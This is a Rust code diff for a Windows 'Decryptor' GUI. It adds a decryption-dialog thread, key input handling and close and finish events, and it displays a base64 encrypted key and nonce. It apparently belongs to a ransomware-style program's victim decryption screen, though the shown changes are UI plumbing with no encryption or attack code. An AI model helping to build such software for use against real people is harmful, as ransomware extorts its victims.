@@ -3,6 +3,9 @@ mod decryption_dialog;
 extern crate native_windows_gui as nwg;
 extern crate native_windows_derive as nwd;
 
+use std::cell::RefCell;
+use std::path::PathBuf;
+use std::thread;
 use anyhow::{Context, Result};
 use base64::Engine;
 use nwd::NwgUi;
@@ -24,12 +27,14 @@ pub struct Decryptor {
         center: true,
         flags: "WINDOW|VISIBLE",
     )]
-    #[nwg_events(OnWindowClose: [nwg::stop_thread_dispatch()])]
+    #[nwg_events(OnWindowClose: [Decryptor::on_close])]
     window: nwg::Window,
 
     #[nwg_control]
-    #[nwg_events(OnNotice: [nwg::stop_thread_dispatch()])] // TODO: handle decryption finish
+    #[nwg_events(OnNotice: [Decryptor::on_decryption_finish])]
     decryption_end_notice: nwg::Notice,
+    decryption_dialog_thread: RefCell<Option<thread::JoinHandle<Result<()>>>>,
+    working_path: PathBuf,
 
     #[nwg_resource(source_bin: Some(BIGRAT_SIDEBAR.as_slice()))]
     bigrat_sidebar: nwg::Bitmap,
@@ -77,7 +82,7 @@ pub struct Decryptor {
     info_box: nwg::TextBox,
 
     #[nwg_control(
-        text: "OWIK8IzExLK6P4jUgC2nL8I4zAXcaqLZfuLTxi52OmWhSjWdbCgeomPP2lNQTCvOOlWf",
+        text: "",
         position: (CONTENT_H_START, 530),
         size: (MAX_CONTENT_WIDTH, 25),
     )]
@@ -94,20 +99,38 @@ pub struct Decryptor {
 
 impl Decryptor {
     fn decrypt(&self) {
-        DecryptionDialog::open(self.decryption_end_notice.sender());
+        *self.decryption_dialog_thread.borrow_mut() = Some(DecryptionDialog::open(
+            self.decryption_end_notice.sender(),
+            self.decryptor_key_input.text(),
+            self.working_path.clone(),
+        ));
+    }
+
+    fn on_decryption_finish(&self) {
+        if self.decryption_dialog_thread.take().unwrap().join().unwrap().is_ok() {
+            nwg::stop_thread_dispatch();
+        }
+    }
+
+    fn on_close(&self) {
+        if self.decryption_dialog_thread.try_borrow().unwrap().is_none() {
+            nwg::stop_thread_dispatch();
+        }
     }
 }
 
 
-pub fn start_decryptor_gui(status_data: StatusData) -> Result<()> {
+pub fn start_decryptor_gui(status_data: StatusData, working_path: PathBuf) -> Result<()> {
     nwg::init().with_context(|| "Failed to init Native Windows GUI")?;
 
     if let Err(e) = Font::set_global_family("Segoe UI") {
         eprintln!("Failed to set the global font: {e}");
     }
 
-    let window = Decryptor::build_ui(Default::default())
-        .with_context(|| "Failed to build UI")?;
+    let window = Decryptor::build_ui(Decryptor {
+        working_path,
+        ..Default::default()
+    }).with_context(|| "Failed to build UI")?;
 
     let pair_b64 = base64::engine::general_purpose::STANDARD_NO_PAD
         .encode([status_data.encrypted_key, status_data.encrypted_nonce].concat());
